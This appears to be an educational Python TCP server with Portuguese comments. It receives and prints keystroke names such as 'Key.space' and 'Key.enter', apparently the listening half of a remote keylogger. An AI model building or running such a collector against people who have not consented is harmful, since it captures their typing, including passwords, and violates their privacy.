import socket

HOST = socket.gethostname()
# um nome de host é um rótulo atribuído a um dispositivo conectado a uma rede de computadores é usado
# para identificar o dispositivo

PORTA = 5000
# As portas permitem que os servidores diferenciem facilmente entre diferentes tipos de tráfego:
# os e-mails vão para uma porta diferente daquela das páginas web, por exemplo,
# É importe que seja instanciado em um valor acima de 1024, para que não haja conflito entre as demais portas já usadas
# pela maquina

TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Instância do objeto do tipo socket no formatto TCP/IP
#  Como padrão a biblioteca socket do python faz essa implementação
# af_inet = suporte para dominio de intener tipo notacao de site ou ipv4
# sock_stream = cria um objeto de socket do tipo TCP


TCP.bind((HOST, PORTA))
#  Bind: realiza a associação entre a estrutura socket e o endereço/porta do servidor.
#  O comando “bind” vincula o endereço como exemplo 10.1.1.1 do servidor e a porta 5000
#  ao socket que foi criado pelo sistema operacional do servidor.

TCP.listen(1)
# O nosso servidor TCP/IP vai receber 1 conexão por vez.
# A função listen() 'ouvindo' coloca o socket no modo servidor, e define a quantidade de solicitações
# de novas conexões que podem ser enfileiradas.


con, cliente = TCP.accept()
# A função accept() retorna um novo socket para ser usado com aquela conexão e, o endereço do cliente.
# O novo socket utiliza uma nova porta atribuída automaticamente pelo kernel. Ao encerrar a coneção
# essa porta é destruida automatiocamente


print("Conexão de: " + str(cliente))
# Ao estabelecer uma conexão com o clinte irá printar está conexão pro servidor


global key_words
# criação da variável global key_words, para ser usada em todo o projeto

while True:
    key_words = ''
    # É iniciada a lista de recebimento dos caractéres

    keydata = con.recv(1024)
    # Aguarda um dado enviado pela rede de até 1024 Bytes, a função ‘recv’ possui somente
    # 1 argumento que é o tamanho do Buffer

    key = keydata.decode('utf-8')
    # convertendo de byte para string o caráctere enviado pelo cliente

    if str(key) == "Key.space":

        key = ''
    # inplementando a função de espaço

    elif str(key) != "Key.enter":
        key_words = key_words + key
        retira_aspas = "'"

        for aspas in retira_aspas:
            key_words = key_words.replace(aspas, '')
    # implementando a retirada de aspas das letras recebidas

    elif str(key) == "Key.enter":
        key = '\n'
    # inplementando a função do enter

    key_words = key_words + key
    print(key_words)
